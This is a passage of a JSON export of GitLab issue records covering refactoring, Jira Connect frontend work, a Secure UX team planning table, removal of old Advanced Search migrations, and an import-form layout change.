Kim","state":"active","avatar_url":"https://secure.gravatar.com/avatar/84a984a56c54d1d31338678421cecc32?s=80\u0026d=identicon","web_url":"https://gitlab.com/dskim_gitlab"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359844","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359844","notes":"https://gitlab.com/api/v4/projects/278964/issues/359844/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359844/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359844","relative":"#359844","full":"gitlab-org/gitlab#359844"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7648,"epic":{"id":454264,"iid":7648,"title":"Submitting MR comment through API fails if the comment contains /merge quick action","url":"/groups/gitlab-org/-/epics/7648","group_id":9970,"human_readable_end_date":"Aug 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106806055,"iid":359836,"project_id":278964,"title":"Incorrect use of EE module for BaseChangesAuditor and its derived classes","description":"## Summary\n\nWe've observed incorrect usage of EE module for `BaseChangesAuditor` and the classes that are derived from it. We only use the `EE` module for modules that we use to prepend onto CE. For classes that only exist in EE, we just add them to `ee/lib` instead of `/ee/lib/ee` directory.\n\n## Improvements\nIf the feature being developed is not present in any form in CE, we donâ€™t need to put the code under the EE namespace. This is as per our [development guidelines](https://docs.gitlab.com/ee/development/ee_features.html#ee-only-features).\n\n\n## Involved components\n\nList files or directories that will be changed by the refactoring.\n\n1. `ee/lib/ee/audit/base_changes_auditor.rb`\n2. `ee/lib/ee/audit/compliance_framework_changes_auditor.rb`\n3. `ee/lib/ee/audit/group_changes_auditor.rb`\n4. `ee/lib/ee/audit/project_changes_auditor.rb`\n5. `ee/lib/ee/audit/project_ci_cd_setting_changes_auditor.rb`\n6. `ee/lib/ee/audit/project_feature_changes_auditor.rb`\n7. `ee/lib/ee/audit/project_setting_changes_auditor.rb`\n8. `ee/lib/ee/audit/protected_branches_changes_auditor.rb`\n\n\n## Implementation plan\n\n1. Move all the files listed above to `ee/lib` directory.\n2. Move and update the associated RSpec files.\n3. Check for usage of these classes and update their invocation to point to the correct directory. For example for `ProtectedBranchesChangesAuditor` it would change from `EE::Audit::ProtectedBranchesChangesAuditor` to `Audit::ProtectedBranchesChangesAuditor`","state":"closed","created_at":"2022-04-19T04:01:05.150Z","updated_at":"2022-12-06T02:04:39.173Z","closed_at":"2022-10-06T05:24:09.887Z","closed_by":{"id":9821577,"username":"huzaifaiftikhar1","name":"Huzaifa Iftikhar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9821577/avatar.png","web_url":"https://gitlab.com/huzaifaiftikhar1"},"labels":["backend","devops::govern","group::compliance","maintenance::refactor","section::sec","type::maintenance","workflow::production"],"milestone":{"id":2453027,"iid":77,"group_id":9970,"title":"15.5","description":"","state":"active","created_at":"2022-02-03T22:29:56.909Z","updated_at":"2022-02-03T22:29:56.909Z","due_date":"2022-10-17","start_date":"2022-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/77"},"assignees":[{"id":10886527,"username":"ali_o_kan","name":"Laurent Deketelaere","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10886527/avatar.png","web_url":"https://gitlab.com/ali_o_kan"}],"author":{"id":9821577,"username":"huzaifaiftikhar1","name":"Huzaifa Iftikhar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9821577/avatar.png","web_url":"https://gitlab.com/huzaifaiftikhar1"},"type":"ISSUE","assignee":{"id":10886527,"username":"ali_o_kan","name":"Laurent Deketelaere","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10886527/avatar.png","web_url":"https://gitlab.com/ali_o_kan"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359836","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359836","notes":"https://gitlab.com/api/v4/projects/278964/issues/359836/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359836/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359836","relative":"#359836","full":"gitlab-org/gitlab#359836"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106805670,"iid":359834,"project_id":278964,"title":"Jira Connect: Move user data into Vuex","description":"The following comment from @afontaine should be addressed: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/84917#note_915737266\n\n\u003e Should this action and data be added to the vuex store?\n\nWe can do the following:\n- make the user fetch a Vuex action\n- store the fetched user object in Vuex\n- remove all props associated with the user object, source data from Vuex state instead.\n\nThis is all currently happening behind the `jira_connect_oauth` feature flag.\n\n### Availability \u0026 Testing\n\n1. Component specs should continue to pass.\n2. Suggestion: consider a feature spec around Jira connect subscriptions\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e","state":"closed","created_at":"2022-04-19T03:43:44.409Z","updated_at":"2022-11-22T18:44:15.684Z","closed_at":"2022-05-17T05:05:14.695Z","closed_by":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"labels":["Jira::ConnectApp","devops::manage","feature flag","frontend","group::integrations","quad-planning::complete-action","section::dev","type::maintenance","workflow::production"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"}],"author":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"type":"ISSUE","assignee":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359834","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359834","notes":"https://gitlab.com/api/v4/projects/278964/issues/359834/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359834/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359834","relative":"#359834","full":"gitlab-org/gitlab#359834"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5650,"epic":{"id":230344,"iid":5650,"title":"Self-managed support extended to GitLab for Jira app","url":"/groups/gitlab-org/-/epics/5650","group_id":9970,"human_readable_end_date":"May 17, 2023","human_readable_timestamp":"\u003cstrong\u003e4\u003c/strong\u003e months remaining"},"iteration":null,"health_status":null},{"id":106794019,"iid":359817,"project_id":278964,"title":"Secure \u0026 Protect Team Planning Issue for 15.1","description":"### Product Designer's Available Capacity\n\u003c!-- Group Capacity is the number of weight points you are able to contribute to your group work this milestone.\nFlex Capacity is any extra weight points you'll hold in reserve to accommodate any OKR, UX Dept, or any other extracurricular work that you expect will pop up during this milestone  --\u003e\n| Designer | Group Capacity | Flex Capacity | TOTAL Capacity |\n| ------ | ------ | ------ | ------ |\n| Andy     | 13  |  2 |  15 |\n| Becka    | 15 | 0  | 15  |\n| Camellia | -- | -- | -- |\n| Michael  | 15 | 3 | 18 |\n\n ### Product Designer's Out Of Office (OOO)\n | Designer | OOO Start - End |\n | -------- | --------------- |\n | Andy     |                 |\n | Becka    |                 |\n | Camellia |  Out through 2022-06-30  |\n | Michael  |                 |\n\n ### Review Existing UX SUS Related Issues\n NOTE: We need to strive to act upon these issues quickly as they will impact our usability\n * [SUS Related Issue Board](https://gitlab.com/groups/gitlab-org/-/boards/3738104?label_name[]=SUS\u0026label_name[]=severity%3A%3A2)\n\n### Composition Analysis UX Needs - UX Roadmap Theme: `\u003ctheme link here\u003e`\n| Priority | Issue/Epic | State | ðŸ’¯ Need / ðŸ’ª Nice to have | Designer | Ready for Build By | â‰… Weight | Carryover Notes |\n| ------ | ------ | ------ | ------ | ------ | ------ | ------ | ------ |\n| 1 | [Add SBOM Subheading](https://gitlab.com/gitlab-org/gitlab/-/issues/361014) | In Progress | ðŸ’ª | @beckalippert | %15.2 |  |  |\n| 2 | [Improve Dependency List Empty State](https://gitlab.com/gitlab-org/gitlab/-/issues/351118) |  | ðŸ’ª |  | ? | 1 | ? |\n| 3 | [ðŸŽ¨ Design: License Approval Policies](https://gitlab.com/gitlab-org/gitlab/-/issues/362838) |  | ðŸ’ª |  | ? |  | ? |\n| 4 | [ðŸŽ¨ Design: Group/Sub-Group Level Dependency List](https://gitlab.com/gitlab-org/gitlab/-/issues/362827) |  | ðŸ’ª |  | ? |  | ? |\n| 5 | [ðŸŽ¨ Design: Add Dependency List Filtering and Searching](https://gitlab.com/gitlab-org/gitlab/-/issues/362818) | Ready for Design | ðŸ’ª |  | ? |  | This should probably be done together with Threat Insights work |\n| 6 | [ðŸŽ¨ Design: Dependency List Grouping](https://gitlab.com/gitlab-org/gitlab/-/issues/362829) |  | ðŸ’ª |  | ? |  |  |\n| - | [Make state of approval more clear](https://gitlab.com/gitlab-org/gitlab/-/issues/340453) |  | ðŸ’ª |  | ? | 4 | ? |\n| - | [Make state of license database clear](https://gitlab.com/gitlab-org/gitlab/-/issues/341615) |  | ðŸ’ª |  | ? | ? | ? |\n| - | [Automatic remediation states](https://gitlab.com/gitlab-org/gitlab/-/issues/343487) | When unblocked will then need to progress by finding edge cases and working them | ðŸ’ª |  | ? | ? | ? |\n\n### Container Security UX Needs\n\nCurrent Design Theme: Decrease Container Scanning Noise\n\n| Priority | Issue/Epic | State | ðŸ’¯ Need / ðŸ’ª Nice to have | Designer | Ready for Build By | â‰… Weight | Carryover Notes |\n| ------ | ------ | ------ | ------ | ------ | ------ | ------ | ------ |\n| 1 | https://gitlab.com/gitlab-org/gitlab/-/issues/356808+ | ~\"workflow::ready for design\" | ðŸ’ª | |  %15.3 | | |\n| 2 | https://gitlab.com/gitlab-org/gitlab/-/issues/356809+ | ~\"workflow::ready for design\" | ðŸ’ª | | n/a - this is a research spike | | |\n| 3 | [Allow configurable allowlist path](https://gitlab.com/gitlab-org/gitlab/-/issues/37226) | ~\"workflow::ready for design\" | ðŸ’ª | | | | |\n| 4 | [Better support scanning of multiple container images](https://gitlab.com/groups/gitlab-org/-/epics/3139) | ~\"workflow::ready for design\" | ðŸ’ª | | | | |\n| 5 | [Identify if a finding is fixable](https://gitlab.com/groups/gitlab-org/-/epics/6846) | ~\"workflow::ready for design\" | ðŸ’ª | | | | |\n| 6 | [ðŸŽ¨ Design Follow-up: Investigate validation of required approvals to avoid dead-end-rules](https://gitlab.com/gitlab-org/gitlab/-/issues/352591) | ~\"workflow::ready for design\" | ðŸ’ª | | This is important but not urgent. Timeline can be flexible. | | |\n| 7 | Assistance with MR reviews | \u003c!-- Needs solution validation --\u003e | \u003c!-- ðŸ’ª  --\u003e | \u003c!-- designer name  --\u003e | \u003c!-- Milestone  --\u003e | \u003c!-- approx weight --\u003e | \u003c!-- Add notes why not done in prev milestone --\u003e |\n\n### Dynamic Analysis:DAST/Fuzz UX Needs - https://gitlab.com/gitlab-org/gitlab/-/issues/357445+\n| Priority | Issue/Epic | State | ðŸ’¯ Need / ðŸ’ª Nice to have | Designer | Ready for Build By | â‰… Weight | Carryover Notes |\n| ------ | ------ | ------ | ------ | ------ | ------ | ------ | ------ |\n| 1 | [Problem validation: How do DevOps teams want to configure their security tools](https://gitlab.com/gitlab-org/ux-research/-/issues/1618)  | Analysis complete | ðŸ’¯ | @mfangman | \u003c!-- Milestone  --\u003e | 5 | Session tagging complete, data synthesis required next |\n| 2 | [Design: DAST pre-flight config validation](https://gitlab.com/gitlab-org/gitlab/-/issues/344959)  | Solution validation | ðŸ’¯ | @mfangman |  | 3 | Design were updated and solution validation planning was started in %\"15.0\"  |\n| 3 | Preperation for DAST CMS - Complete maturity | | ðŸ’¯ | @mfangman | Recuriting to start around %\"15.2\" | 3 | |\n| 4 | ðŸŽ¨ Design: Allow security profiles to be used by other scanners  |  | ðŸ’ª | @mfangman | \u003c!-- Milestone  --\u003e | 3 | Important design update, but not critical at the moment |\n\n### SAST UX Needs - UX Roadmap Theme: `\u003ctheme link here\u003e`\n| Priority | Issue/Epic | State | ðŸ’¯ Need / ðŸ’ª Nice to have | Designer | Ready for Build By | â‰… Weight | Carryover Notes |\n| ------ | ------ | ------ | ------ | ------ | ------ | ------ | ------ |\n| 1 | `DUPLICATE FROM DAST` [Problem validation: How do DevOps teams want to configure their security tools](https://gitlab.com/gitlab-org/ux-research/-/issues/1618)  | Analysis complete | ðŸ’¯ | @mfangman | \u003c!-- Milestone  --\u003e | â€“ | Session tagging complete, data synthesis required next |\n| 2 | [SAST UX Roadmap](https://gitlab.com/gitlab-org/gitlab/-/issues/356902) | In progress | ðŸ’¯ | @mfangman | | 2 | Refine themes and record walkthrough |\n| 3 | https://gitlab.com/gitlab-org/gitlab/-/issues/359847+ | Designs started in %\"15.0\", small changes and support likely needed  | ðŸ’¯ | @mfangman |  | 2 |  |\n\n### Vulnerability Management UX Needs - UX Roadmap Theme: `\u003ctheme link here\u003e`\n| Priority | Issue/Epic | State | ðŸ’¯ Need / ðŸ’ª Nice to have | Designer | Ready for Build By | â‰… Weight | Carryover Notes |\n| ------ | ------ | ------ | ------ | ------ | ------ | ------ | ------ |\n| 1 | [Solution Validation: Advanced filtering on the Vulnerability Report](https://gitlab.com/gitlab-org/ux-research/-/issues/1904) | ~\"workflow::solution validation\"  | ðŸ’¯| @beckalippert  | %\"15.1\"  | 5 | \u003c!-- Add notes why not done in prev milestone --\u003e |\n| 2 | [Show \"pipeline security tab\" ingestion status](https://gitlab.com/gitlab-org/gitlab/-/issues/352880) | ~\"workflow::design\" |  ðŸ’¯ | @beckalippert  | %\"15.1\"  | 3 | \u003c!-- Add notes why not done in prev milestone --\u003e |\n| 3 | [Design: Auto-dismiss irrelevant vulnerabilities](https://gitlab.com/gitlab-org/gitlab/-/issues/299552) | ~\"workflow::design\" | ðŸ’ª | @beckalippert  | %\"15.2\"  | 3 | \u003c!-- Add notes why not done in prev milestone --\u003e |\n\n### OKR/Extra UX Needs\n| Priority | Issue/Epic | State | ðŸ’¯ Need / ðŸ’ª Nice to have | Designer | Ready for Build By | â‰… Weight |\n| ------ | ------ | ------ | ------ | ------ | ------ | ------ |\n| 1 | Configure/Monitor Collaboration | - | ðŸ’¯ | @andyvolpe  | 15.1 | 6 |\n| 1 | Q2 OKR: UX Roadmaps [part 2](https://gitlab.com/gitlab-org/gitlab-design/-/issues/1953) | Planning | ðŸ’¯ | @andyvolpe | 15.1 | 4 |\n| - | UX Roadmap for Threat Insights and Container Security - follow up tasks | - | ðŸ’¯ | @beckalippert | %\"15.1\" | 5 |\n| - | Crucial conversations | - | ðŸ’¯ | @beckalippert | %\"15.1\" | 1 |\n| - | Michael's career development | â€“ | :100: | @mfangman | | 3 | |\n| - | [Persona \u0026 JTBD research](https://gitlab.com/gitlab-org/ux-research/-/issues/1920) | Planning | :100: | @andyvolpe | TBD | 2 | \n\n### What research is happening right now? [(Link to Sheet)](https://docs.google.com/spreadsheets/d/12qckNjL7HGEwJeGwVnVUwk3fbuEj1DSB0N4paSwgAks/edit?usp=sharing) \n\n| Project Title                                                                               | Issue | Support Level       | Section or Group                         | Status           | Timeline  | DRI                                           |\n| ------------------------------------------------------------------------------------------- | ----- | ------------------- | ---------------------------------------- | ---------------- | --------- | --------------------------------------------- |\n| Usability Benchmarking Study                                                                | \u00267918 | ðŸ¥‡ End-to-End       | TBD                                      | Planning         |           | [Michael Oliver](mailto:moliver@gitlab.com)   |\n| How do DevOps teams want to configure their security tools?                                 | #1618 | ðŸ¥‡ End-to-End       | Secure                                   | Summarizing Data |           | [Michael Fangman](mailto:mfangman@gitlab.com) |\n| Internal Interviews for new Secure user Personas                                            | \u00267363 | ðŸ¥‡ End-to-End       | Secure                                   | Planning         |           | [Michael Oliver](mailto:moliver@gitlab.com)   |\n| Finish Investigating current state of open Actionable Insight (AI) issues \u0026 Create Strategy | #1878 | ðŸ¥ˆ Task Specific    | UXR Team                                 | Summarizing Data |           | [Michael Oliver](mailto:moliver@gitlab.com)   |\n| Understanding the needs/motivations/goals of Code Quality Users                             | #1886 | ðŸ¥ˆ Task Specific    | Code Quality (Static Analysis group)     | Planning         |           | [Connor Gilbert](mailto:cgilbert@gitlab.com)  |\n| Vulnerability Prioritization                                                                | #1890 | ðŸ¥ˆ Task Specific    | Both Protect and Secure: Threat Insights | In-Waiting       | 11/1/2022 | [Sam White](mailto:swhite@gitlab.com)         |\n| Vulnerability groups and customizable saved views                                           | #1869 | ðŸ¥‰ Consult \u0026 Review | Threat Insights                          | Summarizing Data | 6/1/2022  | [Matt Wilson](mailto:mwilson@gitlab.com)      |\n| Solution Validation: Advanced filtering on the Vulnerability Report                         | #1904 | ðŸ¥‰ Consult \u0026 Review | Threat Insights                          | Planning         |           | Becka Lippert                                 |\n\n * [x] Set the Milestone (current Milestone)\n * [x] Set the Due Date for the end of the current Milestone\n * [x] Assign the entire team PMs and PDs","state":"closed","created_at":"2022-04-18T19:56:08.603Z","updated_at":"2022-06-21T14:27:20.479Z","closed_at":"2022-06-21T14:27:20.460Z","closed_by":{"id":5291762,"username":"jmandell","name":"Justin Mandell","state":"active","avatar_url":"https://secure.gravatar.com/avatar/aa77747277d0bb7c31300ca6b0cdde56?s=80\u0026d=identicon","web_url":"https://gitlab.com/jmandell"},"labels":["Planning Issue","auto updated","missed:15.0","missed:15.1","section::sec"],"milestone":{"id":2453024,"iid":74,"group_id":9970,"title":"15.2","description":"","state":"active","created_at":"2022-02-03T22:24:46.818Z","updated_at":"2022-02-03T22:26:32.010Z","due_date":"2022-07-17","start_date":"2022-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/74"},"assignees":[{"id":2338871,"username":"andyvolpe","name":"Andy Volpe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2338871/avatar.png","web_url":"https://gitlab.com/andyvolpe"},{"id":4415483,"username":"beckalippert","name":"Becka Lippert","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4415483/avatar.png","web_url":"https://gitlab.com/beckalippert"},{"id":4708748,"username":"matt_wilson","name":"Matt Wilson","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4708748/avatar.png","web_url":"https://gitlab.com/matt_wilson"},{"id":4985194,"username":"derekferguson","name":"Derek Ferguson","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4985194/avatar.png","web_url":"https://gitlab.com/derekferguson"},{"id":5291762,"username":"jmandell","name":"Justin Mandell","state":"active","avatar_url":"https://secure.gravatar.com/avatar/aa77747277d0bb7c31300ca6b0cdde56?s=80\u0026d=identicon","web_url":"https://gitlab.com/jmandell"},{"id":5292351,"username":"sam.white","name":"Sam White","state":"active","avatar_url":"https://secure.gravatar.com/avatar/d467fb024d1858d279e6a36e028436ac?s=80\u0026d=identicon","web_url":"https://gitlab.com/sam.white"},{"id":8655314,"username":"mfangman","name":"Michael Fangman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8655314/avatar.png","web_url":"https://gitlab.com/mfangman"},{"id":8957188,"username":"hbenson","name":"Hillary Benson","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8957188/avatar.png","web_url":"https://gitlab.com/hbenson"},{"id":10034774,"username":"connorgilbert","name":"Connor Gilbert","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10034774/avatar.png","web_url":"https://gitlab.com/connorgilbert"}],"author":{"id":5291762,"username":"jmandell","name":"Justin Mandell","state":"active","avatar_url":"https://secure.gravatar.com/avatar/aa77747277d0bb7c31300ca6b0cdde56?s=80\u0026d=identicon","web_url":"https://gitlab.com/jmandell"},"type":"ISSUE","assignee":{"id":2338871,"username":"andyvolpe","name":"Andy Volpe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2338871/avatar.png","web_url":"https://gitlab.com/andyvolpe"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2022-05-17","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359817","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":3},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"3 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359817","notes":"https://gitlab.com/api/v4/projects/278964/issues/359817/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359817/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359817","relative":"#359817","full":"gitlab-org/gitlab#359817"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6247,"epic":{"id":295539,"iid":6247,"title":"Secure \u0026 Govern UX Team Planning","url":"/groups/gitlab-org/-/epics/6247","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":106793309,"iid":359809,"project_id":278964,"title":"Removal of old Advanced Search migrations in Gitlab 15.0","description":"**Note: This is for the Removal Communication. \nThe work for removing the migrations is https://gitlab.com/gitlab-org/gitlab/-/issues/357230**\n\n\nFor every major release, we deprecate old Advanced Search migrations. This is the issue for depreciating migrations in the next major release %\"15.0\".\n\nFollow the instructions for removing old Elasticsearch migrations.\n\nhttps://docs.gitlab.com/ee/development/elasticsearch.html#deleting-advanced-search-migrations-in-a-major-version-upgrade \n\n\n\n\n\n\n\n### 14.0 Old Migration removal Refrence\n\n- [Remove old Advanced Search migrations](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/63001)\n- [Remove old Advanced Search migrations [part 2]](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/63020) \n- [Remove old Advanced Search migrations [part 3]](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/63021)\n\n\n/cc @JohnMcGuire @changzhengliu\n\n\n## Release Notes\nThis breaking change enables easier Advanced Search migrations for upgrading GitLab.\n\nIndexes that have not finished migrations up to %\"14.9\"  will no longer be supported after GtiLab %\"15.0\"\n\nCustomers will need complete all Elasticsearch migrations before upgrading to the latest major version\nhttps://docs.gitlab.com/ee/development/elasticsearch.html#deleting-advanced-search-migrations-in-a-major-version-upgrade","state":"closed","created_at":"2022-04-18T19:27:31.093Z","updated_at":"2022-05-30T15:58:19.363Z","closed_at":"2022-05-21T00:10:49.648Z","closed_by":{"id":4888751,"username":"changzhengliu","name":"Changzheng Liu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4888751/avatar.png","web_url":"https://gitlab.com/changzhengliu"},"labels":["Category:Global Search","Deliverable","GitLab Premium","advanced search","auto updated","automation:ml","breaking change","devops::data_stores","documentation","group::global search","needs weight","section::enablement","type::maintenance","workflow::ready for development"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":5724558,"username":"JohnMcGuire","name":"John McGuire","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5724558/avatar.png","web_url":"https://gitlab.com/JohnMcGuire"}],"author":{"id":5724558,"username":"JohnMcGuire","name":"John McGuire","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5724558/avatar.png","web_url":"https://gitlab.com/JohnMcGuire"},"type":"ISSUE","assignee":{"id":5724558,"username":"JohnMcGuire","name":"John McGuire","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5724558/avatar.png","web_url":"https://gitlab.com/JohnMcGuire"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359809","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359809","notes":"https://gitlab.com/api/v4/projects/278964/issues/359809/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359809/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359809","relative":"#359809","full":"gitlab-org/gitlab#359809"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106785722,"iid":359787,"project_id":278964,"title":"Streamline decision making for importing a project by URL","description":"## Problem to solve\n\nThe order of the elements on the form to import a project by URL spreads out information and decision points in a non-linear fashion.\n\n## Proposal\n\n- Move the `info` section to the top of the form\n- Move the `mirror repository` checkbox under the Git repository URL input \n\n| Current | Proposed |\n| ------ | ------ |\n| ![IP_-_Current](/uploads/c73695b3ff1811f8b234693598f8fa49/IP_-_Current.png) | ![IP_-_Proposal](/uploads/a428417b75655f41a336821bd2fd220c/IP_-_Proposal.png) |\n\n# Implementation plan\n\n* File to implement this change: `app/views/shared/_import_form.html.haml`","state":"closed","created_at":"2022-04-18T16:49:26.558Z","updated_at":"2022-04-29T20:30:03.091Z","closed_at":"2022-04-29T20:30:03.074Z","closed_by":{"id":1230286,"username":"xanf","name":"Illya Klymov","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ce4d16557b46210fa57641531b570dd4?s=80\u0026d=identicon","web_url":"https://gitlab.com/xanf"},"labels":["Category:Importers","UX","auto updated","devops::manage","feature::enhancement","frontend","group::import","section::dev","type::feature","workflow::ready for development"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":11430473,"username":"cheshirecat902","name":"Artyom","state":"active","avatar_url":"https://secure.gravatar.com/avatar/181a47dae550e173b5dcaf8391eeedd9?s=80\u0026d=identicon","web_url":"https://gitlab.com/cheshirecat902"}],"author":{"id":6193108,"username":"aregnery","name":"Austin Regnery","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6193108/avatar.png","web_url":"https://gitlab.com/aregnery"},"type":"ISSUE","assignee":{"id":11430473,"username":"cheshirecat902","name":"Artyom","state":"active","avatar_url":"https://secure.gravatar.com/avatar/181a47dae550e173b5dcaf8391eeedd9?s=80\u0026d=identicon","web_url":"https://gitlab.com/cheshirecat902"},"user_notes_count":11,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359787","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359787","notes":"https://gitlab.com/api/v4/projects/278964/issues/359787/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359787/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359787","relative":"#359787",